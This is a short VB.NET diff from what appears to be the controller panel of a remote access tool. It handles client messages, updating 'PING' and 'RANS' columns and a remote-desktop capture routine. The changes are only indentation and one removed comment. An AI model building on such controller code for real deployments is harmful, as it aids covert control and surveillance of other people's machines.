@@ -72,7 +72,6 @@
                         Exit Sub
                     End If
                     C.L.SubItems(M.PING.Index).Text = A(1).ToString
-                    'M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     Exit Select
 
 
@@ -83,7 +82,7 @@
                     End If
                     C.L.SubItems(M.RANS.Index).Text = A(1).ToString
                     M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
-                    Exit Select
+                        Exit Select
 
                 Case "!SP"
                     If M.InvokeRequired Then
@@ -120,7 +119,7 @@
 
 #Region "Remote Desktop"
 
-                Case "!" ' i recive size of client screen
+                        Case "!" ' i recive size of client screen
                     ' lets start Cap form and start capture desktop
                     If M.InvokeRequired Then
                         M.Invoke(New _Read(AddressOf Read), C, b)
